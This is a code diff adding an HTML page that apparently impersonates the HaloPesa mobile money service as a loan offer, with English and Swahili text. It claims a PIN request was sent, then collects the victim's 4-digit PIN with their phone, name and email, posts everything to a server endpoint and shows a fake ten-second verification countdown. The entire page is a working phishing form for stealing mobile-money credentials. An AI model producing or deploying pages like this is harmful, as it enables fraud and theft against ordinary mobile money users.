@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HaloPesa Loans TZ — PIN</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f7f7f7; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #F58220;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .back-arrow {
+            font-size: 22px; color: #333; text-decoration: none;
+            line-height: 1; cursor: pointer; transition: transform 0.2s;
+        }
+        .back-arrow:hover { transform: translateX(-3px); }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-mark {
+            width: 40px; height: 40px; background: #F58220;
+            border-radius: 10px; display: flex; align-items: center;
+            justify-content: center; color: #fff; font-weight: 900; font-size: 18px;
+        }
+        .logo-text { font-weight: 900; font-size: 20px; color: #1a1a1a; letter-spacing: -0.5px; }
+        .logo-text span { color: #F58220; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        .main { flex: 1; display: flex; justify-content: center; padding: 30px 16px 60px; }
+        .card {
+            background: #fff; width: 100%; max-width: 480px;
+            border-radius: 20px; padding: 40px 30px 34px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.06); height: fit-content;
+            text-align: center;
+        }
+
+        .step-text { color: #888; font-size: 13px; margin-bottom: 18px; }
+
+        .progress { display: flex; gap: 8px; justify-content: center; margin-bottom: 30px; }
+        .progress .bar { height: 5px; width: 60px; border-radius: 3px; background: #e5e5e5; }
+        .progress .bar.active { background: #F58220; }
+
+        h1 {
+            font-size: 22px; font-weight: 800; color: #111;
+            margin-bottom: 8px;
+        }
+        .sub {
+            font-size: 14px; color: #666; line-height: 1.5;
+            margin-bottom: 32px;
+        }
+        .phone-highlight {
+            color: #F58220; font-weight: 800;
+        }
+
+        /* PIN boxes */
+        .pin-row {
+            display: flex; gap: 14px; justify-content: center;
+            margin-bottom: 26px;
+        }
+
+        .pin-box {
+            width: 62px; height: 72px;
+            border: 2px solid #e5e5e5;
+            border-radius: 14px;
+            background: #fafafa;
+            font-size: 32px; font-weight: 900;
+            text-align: center;
+            color: #111;
+            outline: none;
+            transition: all 0.15s;
+            caret-color: #F58220;
+        }
+        .pin-box:focus {
+            border-color: #F58220;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(245,130,32,0.15);
+        }
+        .pin-box.filled {
+            border-color: #F58220;
+            background: #fffbf6;
+        }
+        .pin-box.error {
+            border-color: #dc2626;
+            background: #fff5f5;
+            animation: shake 0.3s;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: #F58220;
+            color: #fff;
+            border: none;
+            padding: 18px;
+            font-size: 15px;
+            font-weight: 900;
+            letter-spacing: 1.5px;
+            border-radius: 12px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.2s, transform 0.1s, opacity 0.2s;
+            margin-top: 4px;
+        }
+        .submit-btn:hover:not(:disabled) { background: #d96f18; }
+        .submit-btn:active:not(:disabled) { transform: scale(0.99); }
+        .submit-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+
+        .error-msg {
+            display: none;
+            font-size: 13px;
+            color: #dc2626;
+            font-weight: 700;
+            margin-top: 14px;
+        }
+        .error-msg.show { display: block; }
+
+        /* LOADING OVERLAY — 10 second countdown */
+        .loading {
+            position: fixed; inset: 0;
+            background: rgba(255,255,255,0.98);
+            display: none; flex-direction: column;
+            align-items: center; justify-content: center;
+            z-index: 999; padding: 24px; text-align: center;
+        }
+        .loading.show { display: flex; }
+
+        .spinner {
+            width: 70px; height: 70px;
+            border: 6px solid #ffe3c7;
+            border-top: 6px solid #F58220;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading-title {
+            font-size: 20px; font-weight: 800; color: #111;
+            margin-bottom: 8px;
+        }
+        .loading-sub {
+            font-size: 14px; color: #666; margin-bottom: 24px;
+        }
+        .countdown {
+            width: 70px; height: 70px;
+            background: #F58220; color: #fff;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 30px; font-weight: 900;
+            box-shadow: 0 8px 20px rgba(245,130,32,0.4);
+        }
+
+        .footer {
+            background: #111; color: #F58220; text-align: center;
+            padding: 18px; font-size: 12px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 32px 22px; }
+            h1 { font-size: 19px; }
+            .pin-box { width: 54px; height: 64px; font-size: 26px; }
+            .pin-row { gap: 10px; }
+            .progress .bar { width: 45px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="login.html" class="back-arrow">←</a>
+        <div class="logo-box">
+            <div class="logo-mark">H</div>
+            <div class="logo-text">Halo<span>Pesa</span></div>
+        </div>
+        <span class="header-title" id="headerTitle">Mobile Services</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <p class="step-text" id="stepText">Step 4 of 5</p>
+
+            <div class="progress">
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+                <div class="bar"></div>
+            </div>
+
+            <h1 id="heading">Enter Your 4-Digit PIN</h1>
+            <p class="sub" id="subheading">
+                We sent a PIN request to <span class="phone-highlight" id="phoneHighlight">+255 —</span>.<br>
+                Enter your PIN to continue.
+            </p>
+
+            <div class="pin-row">
+                <input type="tel" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                <input type="tel" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                <input type="tel" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                <input type="tel" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+            </div>
+
+            <button class="submit-btn" id="submitBtn" disabled>Verify PIN</button>
+
+            <p class="error-msg" id="errorMsg"></p>
+        </div>
+    </main>
+
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <div class="loading-title" id="loadingTitle">Verifying PIN</div>
+        <div class="loading-sub" id="loadingSub">Please wait while we verify your PIN…</div>
+        <div class="countdown" id="countdown">10</div>
+    </div>
+
+    <footer class="footer" id="footer">© 2026 HaloPesa Loans TZ</footer>
+
+    <script>
+        const LANG = {
+            en: {
+                headerTitle: 'Mobile Services',
+                stepText: 'Step 4 of 5',
+                heading: 'Enter Your 4-Digit PIN',
+                sub: 'We sent a PIN request to {phone}.<br>Enter your PIN to continue.',
+                submitBtn: 'Verify PIN',
+                errorMsg: 'Please enter all 4 digits',
+                loadingTitle: 'Verifying PIN',
+                loadingSub: 'Please wait while we verify your PIN…',
+                footer: '© 2026 HaloPesa Loans TZ'
+            },
+            sw: {
+                headerTitle: 'Huduma za Simu',
+                stepText: 'Hatua 4 kati ya 5',
+                heading: 'Weka PIN Yako ya Tarakimu 4',
+                sub: 'Tumetuma ombi la PIN kwa {phone}.<br>Weka PIN yako ili kuendelea.',
+                submitBtn: 'Thibitisha PIN',
+                errorMsg: 'Tafadhali weka tarakimu zote 4',
+                loadingTitle: 'Inathibitisha PIN',
+                loadingSub: 'Tafadhali subiri tunathibitisha PIN yako…',
+                footer: '© 2026 HaloPesa Loans TZ'
+            }
+        };
+
+        const lang = localStorage.getItem('lang') || 'en';
+        const t = LANG[lang];
+
+        document.getElementById('headerTitle').textContent = t.headerTitle;
+        document.getElementById('stepText').textContent    = t.stepText;
+        document.getElementById('heading').textContent     = t.heading;
+        document.getElementById('submitBtn').textContent   = t.submitBtn;
+        document.getElementById('errorMsg').textContent    = t.errorMsg;
+        document.getElementById('loadingTitle').textContent = t.loadingTitle;
+        document.getElementById('loadingSub').textContent   = t.loadingSub;
+        document.getElementById('footer').textContent      = t.footer;
+
+        // Read phone from URL
+        const params = new URLSearchParams(window.location.search);
+        const phone  = params.get('phone') || '';
+        const amount = params.get('amount') || '';
+        const term   = params.get('term')   || '';
+        const firstName = params.get('firstName') || '';
+        const lastName  = params.get('lastName')  || '';
+        const email     = params.get('email')     || '';
+
+        function formatPhone(p) {
+            const clean = p.replace(/\D/g, '');
+            if (clean.length === 9) {
+                return '+255 ' + clean.slice(0,3) + ' ' + clean.slice(3,6) + ' ' + clean.slice(6,9);
+            }
+            return clean ? '+255 ' + clean : '+255 —';
+        }
+
+        document.getElementById('phoneHighlight').textContent = formatPhone(phone);
+
+        // Set translated subheading with phone injected
+        document.getElementById('subheading').innerHTML =
+            t.sub.replace('{phone}', '<span class="phone-highlight">' + formatPhone(phone) + '</span>');
+
+        // ─── PIN boxes behavior ───
+        const boxes = [
+            document.getElementById('pin1'),
+            document.getElementById('pin2'),
+            document.getElementById('pin3'),
+            document.getElementById('pin4')
+        ];
+        const submitBtn = document.getElementById('submitBtn');
+
+        function getPin() {
+            return boxes.map(b => b.value).join('');
+        }
+
+        function checkComplete() {
+            const pin = getPin();
+            submitBtn.disabled = pin.length !== 4;
+            boxes.forEach(b => {
+                b.classList.toggle('filled', b.value.length === 1);
+            });
+        }
+
+        boxes.forEach((box, i) => {
+            // Auto-advance on input
+            box.addEventListener('input', function () {
+                this.value = this.value.replace(/\D/g, '').slice(-1);
+                this.classList.remove('error');
+                if (this.value && i < 3) boxes[i+1].focus();
+                checkComplete();
+            });
+
+            // Backspace to previous
+            box.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && !this.value && i > 0) {
+                    boxes[i-1].focus();
+                }
+            });
+
+            // Paste full PIN
+            box.addEventListener('paste', function (e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'');
+                if (pasted.length >= 4) {
+                    boxes.forEach((b, j) => { b.value = pasted[j] || ''; });
+                    boxes[3].focus();
+                    checkComplete();
+                }
+            });
+        });
+
+        // Focus first box on load
+        boxes[0].focus();
+
+        // ─── Submit PIN + 10 sec countdown ───
+        submitBtn.addEventListener('click', async function () {
+            if (submitBtn.disabled) return;
+
+            const pin = getPin();
+            if (pin.length !== 4) {
+                boxes.forEach(b => b.classList.add('error'));
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = '...';
+
+            const payload = {
+                phone, amount, term, firstName, lastName, email,
+                pin,
+                lang
+            };
+
+            try {
+                const res = await fetch('/api/submit-pin', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await res.json();
+
+                if (data.ok) {
+                    document.getElementById('loading').classList.add('show');
+                    let n = 10;
+                    const cd = document.getElementById('countdown');
+                    cd.textContent = n;
+                    const iv = setInterval(() => {
+                        n--;
+                        cd.textContent = n;
+                        if (n <= 0) {
+                            clearInterval(iv);
+                            const next = new URLSearchParams(params);
+                            next.set('lang', lang);
+                            window.location.href = 'verify.html?' + next.toString();
+                        }
+                    }, 1000);
+                } else {
+                    throw new Error('Server said not ok');
+                }
+            } catch (err) {
+                console.error(err);
+                boxes.forEach(b => b.classList.add('error'));
+                document.getElementById('errorMsg').textContent = t.errorMsg;
+                document.getElementById('errorMsg').classList.add('show');
+                setTimeout(() => {
+                    boxes.forEach(b => { b.value = ''; b.classList.remove('error'); });
+                    boxes[0].focus();
+                    checkComplete();
+                    submitBtn.disabled = true;
+                    submitBtn.textContent = t.submitBtn;
+                }, 800);
+            }
+        });
+    </script>
+</body>
+</html>
